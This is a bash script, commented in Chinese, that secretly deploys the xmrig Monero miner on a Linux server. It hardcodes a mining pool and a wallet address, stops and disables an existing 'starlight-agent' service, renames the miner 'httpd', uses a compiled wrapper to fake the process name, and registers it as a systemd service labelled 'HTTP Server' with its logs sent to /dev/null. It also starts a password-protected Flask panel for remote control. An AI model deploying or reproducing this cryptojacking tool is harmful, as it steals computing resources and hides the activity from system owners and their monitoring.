#!/bin/bash

# 隐藏进程及其特征的一键部署脚本

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 安装必要的依赖
apt update || { echo "更新包列表失败" 1>&2; exit 1; }
apt install -y curl tar gcc python3 python3-venv net-tools || { echo "安装依赖失败" 1>&2; exit 1; }

# 创建虚拟环境
mkdir -p /opt/utils/venv
python3 -m venv /opt/utils/venv || { echo "创建虚拟环境失败" 1>&2; exit 1; }

# 激活虚拟环境并安装 Flask
source /opt/utils/venv/bin/activate
pip install flask || { echo "安装 Flask 失败" 1>&2; exit 1; }
deactivate

# 停止并禁用 starlight-agent.service
systemctl stop starlight-agent.service || { echo "停止 starlight-agent.service 失败" 1>&2; exit 1; }
systemctl disable starlight-agent.service || { echo "禁用 starlight-agent.service 失败" 1>&2; exit 1; }

# 检查依赖
for cmd in curl tar gcc python3; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入矿池 URL 和钱包地址
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入采矿服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 用户输入线程数
read -p "请输入线程数 (默认: 1): " threads
threads=${threads:-1}

# 用户输入管理端密码和端口号
read -p "请输入管理端密码: " web_password
read -p "请输入网页端口 (默认: 5000): " web_port
web_port=${web_port:-5000}

# 检查并删除已存在的用户和组
if id "httpd" &>/dev/null; then
    userdel -r httpd || { echo "删除用户 httpd 失败" 1>&2; exit 1; }
fi
if getent group httpd &>/dev/null; then
    groupdel httpd || { echo "删除组 httpd 失败" 1>&2; exit 1; }
fi

# 创建用户和组
groupadd -r httpd 2>/dev/null || { echo "创建组 httpd 失败" 1>&2; exit 1; }
useradd -r -s /bin/false -g httpd httpd || { echo "创建用户 httpd 失败" 1>&2; exit 1; }

# 检查并删除已存在的目录
if [ -d "/opt/utils" ]; then
    rm -rf /opt/utils || { echo "删除目录 /opt/utils 失败" 1>&2; exit 1; }
fi
if [ -d "/etc/systemd/system/conf.d" ]; then
    rm -rf /etc/systemd/system/conf.d || { echo "删除目录 /etc/systemd/system/conf.d 失败" 1>&2; exit 1; }
fi

# 创建目录
mkdir -p /opt/utils /etc/systemd/system/conf.d || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/utils || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/utils/httpd
rm -rf /opt/utils/xmrig-6.22.2

# 创建 wrapper 以伪装进程名
cat > /opt/utils/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "httpd", 0, 0, 0); // 伪装成 httpd 进程
    execv("/opt/utils/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/utils/wrapper /opt/utils/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/utils/wrapper.c

# 生成配置文件
cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
{
    "cpu": {
        "threads": $threads
    },
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false
}
EOF

# 检查并删除已存在的服务文件
if [ -f "/etc/systemd/system/httpd.service" ]; then
    rm -f /etc/systemd/system/httpd.service || { echo "删除服务文件 httpd.service 失败" 1>&2; exit 1; }
fi

# 创建 systemd 服务文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=$threads
Restart=always
CPUQuota=50%  # 限制 CPU 使用率为 50%

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动服务
systemctl daemon-reload
systemctl enable httpd.service
systemctl start httpd.service || { echo "服务启动失败" 1>&2; exit 1; }

# 创建 Flask 应用
cat > /opt/utils/web_control.py <<EOF
from flask import Flask, render_template, request, redirect, url_for, session
import subprocess
import os
import time

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # 用于 session 加密

# 存储密码
PASSWORD = '$web_password'  # 使用用户输入的密码

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('control'))
        else:
            return render_template('login.html', error='密码错误')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/control')
def control():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('control.html')

@app.route('/start', methods=['POST'])
def start():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    threads = request.form.get('threads', '1')
    duration = request.form.get('duration', '0')  # 0 表示无限运行
    subprocess.run(['systemctl', 'stop', 'httpd.service'], check=True)
    subprocess.run(['systemctl', 'daemon-reload'], check=True)
    subprocess.run(['systemctl', 'start', 'httpd.service'], check=True)
    if duration != '0':
        time.sleep(int(duration))
        subprocess.run(['systemctl', 'stop', 'httpd.service'], check=True)
    return redirect(url_for('control'))

@app.route('/stop', methods=['POST'])
def stop():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    subprocess.run(['systemctl', 'stop', 'httpd.service'], check=True)
    return redirect(url_for('control'))

@app.route('/restart', methods=['POST'])
def restart():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    subprocess.run(['systemctl', 'restart', 'httpd.service'], check=True)
    return redirect(url_for('control'))

@app.route('/reload', methods=['POST'])
def reload():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    subprocess.run(['systemctl', 'daemon-reload'], check=True)
    return redirect(url_for('control'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=$web_port)
EOF

# 创建 HTML 模板目录
mkdir -p /opt/utils/templates

# 创建 login.html
cat > /opt/utils/templates/login.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>登录</title>
</head>
<body>
    <h2>登录</h2>
    <form method="post">
        <label for="password">密码:</label>
        <input type="password" id="password" name="password" required>
        <button type="submit">登录</button>
    </form>
    {% if error %}
        <p style="color: red;">{{ error }}</p>
    {% endif %}
</body>
</html>
EOF

# 创建 control.html
cat > /opt/utils/templates/control.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>控制面板</title>
</head>
<body>
    <h2>控制面板</h2>
    <form method="post" action="/start">
        <label for="threads">线程数:</label>
        <input type="number" id="threads" name="threads" min="1" value="1">
        <br>
        <label for="duration">运行时间(秒, 0为无限):</label>
        <input type="number" id="duration" name="duration" min="0" value="0">
        <br>
        <button type="submit">启动服务</button>
    </form>
    <br>
    <form method="post" action="/stop">
        <button type="submit">停止服务</button>
    </form>
    <br>
    <form method="post" action="/restart">
        <button type="submit">重启服务</button>
    </form>
    <br>
    <form method="post" action="/reload">
        <button type="submit">重新加载服务</button>
    </form>
    <br>
    <a href="/logout">登出</a>
</body>
</html>
EOF

# 设置 Flask 应用可执行权限
chmod +x /opt/utils/web_control.py

# 启动 Flask 应用
nohup /opt/utils/venv/bin/python /opt/utils/web_control.py > /opt/utils/flask.log 2>&1 &

# 输出后续操作说明
echo "部署完成！"
echo "使用以下命令管理服务："
echo "停止服务：systemctl stop httpd.service"
echo "启动服务：systemctl start httpd.service"
echo "重新加载服务：systemctl daemon-reload"
echo "指定运行时间后停止：timeout <秒数> systemctl start httpd.service"
echo "例如：timeout 3600 systemctl start httpd.service （运行1小时后停止）"
echo "网页端控制面板地址：http://<服务器IP>:$web_port"
